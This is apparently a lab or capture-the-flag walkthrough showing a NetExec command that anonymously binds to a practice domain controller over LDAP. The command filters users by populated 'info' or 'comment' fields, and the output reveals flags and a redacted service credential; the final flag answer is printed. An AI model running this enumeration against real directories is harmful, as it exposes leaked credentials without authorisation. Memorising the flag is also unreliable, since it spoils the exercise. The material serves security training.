### Our mission is: Enumerate Active Directory user attributes at scale using NetExec

Blueprint:
`nxc [1. Protocol] [2. Target IP] -u [3. Username] -p [4. Password] --base-dn [5. Search Anchor] [6. Operational Flag] --query [7. Target Filter] [8. Selected Attributes]`

Command:

```bash
nxc ldap 192.168.56.20 -u '' -p '' --base-dn "DC=PENTESTLAB,DC=local" --users --query "(|(info=*)(comment=*))" "cn distinguishedName info comment"

```

Explanation:

`ldap`: Switches NetExec's processing engine to communicate directly with the Active Directory directory service over the standard network port 389.

`192.168.56.20`: Specifies the destination network IP address hosting the target Domain Controller.

`-u '' -p ''`: Submits explicit empty string values for both user identity and password fields. This instructs the engine to negotiate an anonymous/unauthenticated bind context to see if guest query permissions are left exposed on the server.

`--base-dn "DC=PENTESTLAB,DC=local"`: Establishes the precise tree boundary or top-level database root where the automated query engine will begin crawling object records.

`--users`: Directs NetExec to narrow its focus specifically to user account schema classes across the domain space.

`--query "(|(info=*)(comment=*))"`: Implements a server-side logical **OR** (`|`) query filter. It ensures the Domain Controller only spits back user objects where either the `info` or the `comment` text attribute contains data, optimizing network traffic.

`"cn distinguishedName info comment"`: Instructs the tool to parse and display only this specific array of targeted structural schema fields, preventing standard terminal flood by suppressing all other default parameters.

Brief Explanation:

> "Initiate a programmatic, high-speed anonymous search across the Domain Controller at 192.168.56.20 without authenticating. Scan the entire domain user database starting from the root path of PENTESTLAB.local. Use a logical filter to look for any user profiles that have the non-standard 'info' or 'comment' attributes populated with data. Instead of dumping the entire user configuration layout, extract just their names, structural paths, and those custom notes to instantly pinpoint developer errors or leaked flag strings."

Interaction Workflow & Retrieval:

```text
LDAP        192.168.56.20   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PENTESTLAB.local)
LDAP        192.168.56.20   389    DC01             [+] PENTESTLAB.local\: 
LDAP        192.168.56.20   389    DC01             [+] Response for object: CN=Legacy User,OU=IT-ServiceAccounts,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             cn                 Legacy User
LDAP        192.168.56.20   389    DC01             distinguishedName  CN=Legacy User,OU=IT-ServiceAccounts,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             comment            FLAG_M2_T0{fe952761a0d5d62e32ca...20d3f5600fd7285d4a}
LDAP        192.168.56.20   389    DC01             [+] Response for object: CN=Diana Reeves,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             cn                 Diana Reeves
LDAP        192.168.56.20   389    DC01             distinguishedName  CN=Diana Reeves,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             info               FLAG0{921d2a56bd1282...e091fa763754f27648fbe}
LDAP        192.168.56.20   389    DC01             [+] Response for object: CN=Ryan Foster,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             cn                 Ryan Foster
LDAP        192.168.56.20   389    DC01             distinguishedName  CN=Ryan Foster,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             info               svc credential: <Redacted>
LDAP        192.168.56.20   389    DC01             [+] Response for object: CN=Nathan Cross,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             cn                 Nathan Cross
LDAP        192.168.56.20   389    DC01             distinguishedName  CN=Nathan Cross,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             comment            FLAG1{4f3c8b2e1a97d560ec342f8b1094a3d27c6e5f08b23aa914867d390c21e}

```

FLAG: FLAG1{4f3c8b2e1a97d560ec342f8b1094a3d27c6e5f08b23aa914867d390c21e} 
